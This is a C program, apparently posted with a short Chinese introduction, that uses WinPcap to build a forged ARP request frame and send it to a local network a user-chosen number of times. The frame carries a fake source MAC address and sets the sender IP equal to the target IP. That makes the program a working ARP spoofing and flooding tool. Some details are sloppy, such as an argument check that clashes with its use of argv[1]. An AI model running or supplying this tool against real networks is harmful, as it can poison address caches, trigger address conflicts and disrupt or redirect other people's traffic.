代码如下：
int main(int argc, char **argv)
{
       pcap_t *fp;
       char errbuf[PCAP_ERRBUF_SIZE];
       u_char packet[100];
       int i;
       int flood;
       printf("sendpack.c start to run!\n");
       printf("please input the flood = ");
       scanf("%d",&flood);
       /* Check the validity of the command line */
       if (argc != 1)
       {
              printf("usage: %s interface", argv[0]);
              return 1;
       }
   
       /* Open the adapter */
       if ((fp = pcap_open_live("
\\Device\\NPF_{BCC714A5-8FCB-4D2D-9A21-4F70D8E81F2B}",        // name of the device
       65536,                  // portion of the packet to capture. It doesn't matter in this case
1,                        // promiscuous mode (nonzero means promiscuous)
        1000,                  // read timeout
errbuf                  // error buffer
                                                  )) == NULL) {
       fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
              return 2;
       }
       /* Supposing to be on ethernet, set mac destination to 00:50:56:c0:0c:08 */
       packet[0]=0x00;
       packet[1]=0x50;
       packet[2]=0x56;
       packet[3]=0xc0;
       packet[4]=0x0c;
       packet[5]=0x08;
      
       /* set mac source to 1:1:1:1:1:1 */
       packet[6]=0x01;
       packet[7]=0x01;
       packet[8]=0x01;
       packet[9]=0x01;
       packet[10]=0x01;
       packet[11]=0x01;

       /* set arp */
    packet[12]=0x08;//12、13 Type
    packet[13]=0x06;
    packet[14]=0x00;//14、15 Hardware Type
    packet[15]=0x01;
    packet[16]=0x08;//16、17 Protocol Type
    packet[17]=0x00;
    packet[18]=0x06;//Hardware Size
    packet[19]=0x04;//Protocol Size
    packet[20]=0x00;//op
    packet[21]=0x01;//op(1为请求2为应答)
       /* set sender mac address to 1:1:1:1:1:1*/
       packet[22]=0x01;//12、13 Type
    packet[23]=0x01;
    packet[24]=0x01;//14、15 Hardware Type
    packet[25]=0x01;
    packet[26]=0x01;//16、17 Protocol Type
    packet[27]=0x01;
       /* set sender ip address 192.168.227.135*/
    packet[28]=0xc0;
    packet[29]=0xa8;
    packet[30]=0xe3;
    packet[31]=0x87;
      
       /* set Target Mac address 00:50:56:c0:0c:08 */
    packet[32]=0x00;
    packet[33]=0x50;
    packet[34]=0x56;
    packet[35]=0xc0;
       packet[36]=0x0c;
    packet[37]=0x08;
       /* set Target ip address 192.168.227.135*/
    packet[38]=0xc0;
    packet[39]=0xa8;
    packet[40]=0xe3;
    packet[41]=0x87;
      
       /* Fill the rest of the packet */
       for(i=42;i<61;i++)
       {
              packet[i]= 0;
       }
/* Send down the packet */
       for(i=0;i<flood;i++){
       if (pcap_sendpacket(fp,  // Adapter
              packet,                         // buffer with the packet
              100                              // size
              ) != 0)
       {
              fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
              return 3;
       }
       }
       pcap_close(fp);     
       return 0;
}
